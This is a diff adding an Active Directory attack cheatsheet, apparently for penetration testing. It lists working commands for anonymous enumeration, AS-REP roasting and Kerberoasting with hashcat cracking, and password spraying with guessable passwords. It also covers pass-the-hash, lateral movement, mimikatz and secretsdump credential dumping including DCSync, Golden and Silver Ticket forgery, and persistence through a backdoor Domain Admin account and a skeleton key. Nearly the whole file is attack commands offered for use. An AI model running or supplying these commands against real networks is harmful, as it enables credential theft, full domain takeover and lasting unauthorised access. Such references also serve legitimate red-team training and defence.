@@ -1,0 +1,152 @@
+ACTIVE DIRECTORY ATTACKS CHEATSHEET
+
+OVERVIEW
+Active Directory (AD) is Microsoft's directory service used in most enterprise networks.
+Compromising AD means compromising the entire organization.
+Key targets: Domain Controller (DC), Domain Admin (DA) accounts, service accounts.
+
+KEY CONCEPTS
+Domain = logical group of networked objects (users, computers, groups)
+Domain Controller (DC) = server that manages authentication for the domain
+Forest = collection of one or more domains sharing a schema
+Trust = relationship allowing users from one domain to access another
+LDAP = protocol used to query AD (port 389, LDAPS 636)
+Kerberos = default authentication protocol in AD (port 88)
+NTLM = older authentication, still used as fallback
+SMB = file sharing protocol, heavily used in AD (port 445)
+RPC = remote procedure calls (port 135)
+WinRM = Windows remote management (port 5985/5986)
+
+ENUMERATION WITHOUT CREDENTIALS
+
+Network scan for DC:
+nmap -p 88,135,389,445,636,3268,3269 192.168.1.0/24
+Port 88 (Kerberos) = likely domain controller
+
+SMB null session (anonymous):
+smbclient -L //DC_IP -N
+smbmap -H DC_IP
+enum4linux -a DC_IP
+enum4linux-ng -A DC_IP
+crackmapexec smb DC_IP
+
+LDAP anonymous bind:
+ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com"
+ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com" "(objectClass=user)"
+
+AS-REP Roasting (no creds needed):
+Find accounts with Kerberos pre-auth disabled:
+GetNPUsers.py domain.com/ -dc-ip DC_IP -usersfile users.txt -no-pass -outputfile asrep_hashes.txt
+Crack: hashcat -m 18200 asrep_hashes.txt rockyou.txt
+
+ENUMERATION WITH CREDENTIALS
+
+BloodHound (map attack paths visually):
+Install: pip install bloodhound
+Collect data: bloodhound-python -d domain.com -u user -p password -dc DC_IP -c all
+Import JSON files into BloodHound GUI
+Find: Shortest path to Domain Admin, Kerberoastable accounts, AS-REP roastable
+
+PowerView (Windows, run on domain-joined machine):
+Import-Module .\PowerView.ps1
+Get-Domain
+Get-DomainController
+Get-DomainUser
+Get-DomainUser -SPN (find Kerberoastable accounts)
+Get-DomainGroup -Identity "Domain Admins"
+Get-DomainGroupMember -Identity "Domain Admins"
+Get-DomainComputer
+Find-LocalAdminAccess (find where current user is local admin)
+Get-DomainTrust
+Invoke-ShareFinder
+
+Ldapdomaindump:
+ldapdomaindump -u 'domain\user' -p password DC_IP
+
+crackmapexec (swiss army knife):
+crackmapexec smb DC_IP -u user -p password
+crackmapexec smb 192.168.1.0/24 -u user -p password (spray network)
+crackmapexec smb DC_IP -u user -p password --shares
+crackmapexec smb DC_IP -u user -p password --users
+crackmapexec smb DC_IP -u user -p password --groups
+crackmapexec smb DC_IP -u user -p password --sam (dump SAM)
+crackmapexec smb DC_IP -u user -p password -x "whoami" (execute command)
+crackmapexec winrm DC_IP -u user -p password
+
+KERBEROASTING
+Find service accounts with SPNs, request TGS tickets, crack offline.
+GetUserSPNs.py domain.com/user:password -dc-ip DC_IP -outputfile kerberoast.txt
+Crack: hashcat -m 13100 kerberoast.txt rockyou.txt
+Windows: Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash
+
+PASSWORD ATTACKS
+
+Password spraying (avoid lockout):
+crackmapexec smb DC_IP -u users.txt -p "Password123" --continue-on-success
+kerbrute passwordspray -d domain.com users.txt "Password123" --dc DC_IP
+Spray slowly: 1 password per 30 minutes to avoid lockout
+
+Default/common AD passwords to try:
+Password1, Password123, Welcome1, Welcome123
+[Season][Year]: Summer2024, Winter2023
+[CompanyName]123, [CompanyName]2024
+[Month][Year]: January2024
+
+PASS THE HASH (PTH)
+Use NTLM hash without cracking:
+psexec.py -hashes :NTLM_HASH domain/user@target
+wmiexec.py -hashes :NTLM_HASH domain/user@target
+evil-winrm -i target -u user -H NTLM_HASH
+crackmapexec smb target -u user -H NTLM_HASH
+
+PASS THE TICKET (PTT)
+Use Kerberos ticket (TGT/TGS):
+mimikatz: sekurlsa::tickets /export
+Impacket: getTGT.py domain.com/user:password -dc-ip DC_IP
+Export ticket: export KRB5CCNAME=ticket.ccache
+Use with tools: secretsdump.py -k -no-pass domain/user@DC_IP
+
+LATERAL MOVEMENT
+psexec.py domain/user:password@target
+wmiexec.py domain/user:password@target (stealthier)
+smbexec.py domain/user:password@target
+evil-winrm -i target -u user -p password
+atexec.py domain/user:password@target "command"
+
+DUMPING CREDENTIALS
+
+From domain controller (needs DA):
+secretsdump.py domain/admin:password@DC_IP
+secretsdump.py -hashes :HASH domain/admin@DC_IP
+secretsdump.py -just-dc-ntlm domain/admin:password@DC_IP
+
+Mimikatz (on Windows target):
+privilege::debug
+sekurlsa::logonpasswords (dump plaintext passwords from LSASS)
+sekurlsa::wdigest (enable wdigest for plaintext - older systems)
+lsadump::sam (dump local SAM)
+lsadump::dcsync /user:krbtgt (DCSync attack)
+lsadump::dcsync /all /csv (dump all hashes)
+
+DCSync Attack (replicate DC to get all hashes, needs DA or replication rights):
+secretsdump.py -just-dc domain/admin:password@DC_IP
+mimikatz: lsadump::dcsync /domain:domain.com /all
+
+PRIVILEGE ESCALATION IN AD
+
+ACL/ACE Abuse:
+Find interesting ACLs with BloodHound or PowerView
+WriteDACL, GenericAll, GenericWrite, ForceChangePassword = exploitable permissions
+PowerView: Add-DomainObjectAcl, Set-DomainUserPassword
+
+Golden Ticket (forge TGT with krbtgt hash, unlimited access):
+Get krbtgt hash via DCSync
+mimikatz: kerberos::golden /user:Administrator /domain:domain.com /sid:DOMAIN_SID /krbtgt:HASH /ptt
+
+Silver Ticket (forge TGS for specific service):
+mimikatz: kerberos::golden /user:user /domain:domain.com /sid:SID /target:server /service:cifs /rc4:HASH /ptt
+
+DOMAIN PERSISTENCE
+Create new DA account: net user backdoor Password123 /add /domain && net group "Domain Admins" backdoor /add /domain
+AdminSDHolder abuse
+Skeleton Key (patch LSASS so any account accepts master password): mimikatz: misc::skeleton
